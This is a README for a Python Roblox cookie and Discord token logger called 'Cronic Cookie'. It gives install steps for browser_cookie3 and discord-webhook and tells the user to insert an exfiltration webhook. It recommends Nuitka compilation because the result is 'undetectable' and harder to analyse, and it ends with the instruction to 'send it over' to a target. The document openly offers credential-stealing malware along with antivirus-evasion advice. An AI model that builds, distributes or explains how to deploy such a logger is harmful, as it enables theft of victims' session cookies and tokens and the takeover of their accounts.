<!-- ABOUT THE PROJECT -->
## About The Project
Welcome to the newest release of Cronic Cookie, a speedy cookie logger. This is my main project and I am working more and more on it. This will probably become an anti skid which steals the cookie and token of a person that downloaded a leaked copy or leaked it.


### Built With

* [Python](https://python.org)



<!-- GETTING STARTED -->
## Getting Started

To get a local copy up and running follow these simple steps.

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
  ```
  - Go to the folder with all of the files.
  - In the navigation bar (C:/User/Desktop/Roblox-Cookie-Logger) delete everything and type cmd, this will bring up "the shell".
  - Now install the packages as instructed.
  ```

### Installation

1. Download the .zip of this repository
   ```
   git clone https://github.com/DaEpicSwag/Roblox-Cookie-Logger.git
   ```
2. Install PIP packages
   ```
   pip install nuitka
   pip install requests
   pip install browser_cookie3
   pip install discord-webhook
   ```



<!-- USAGE EXAMPLES -->
## Usage
- Replace your webhook. If you are using the advanced logger, make sure to fill in the webhook for the token logger and the cookie logger which are in diffrent locations.

- Compile to exe using [nuitka](https://nuitka.net) PLEASE AND NOT PYINSTALLER. Why?
```
1. Harder to crack because Pyinstaller just unloads the source into the temp directory
2. Undetectable
3. Faster
4. Smaller file size that works well when compressed.
```

- Nuitka How To
```
1. Access the "Shell"
2. python -m nuitka urfile.py
```

- Send it over.
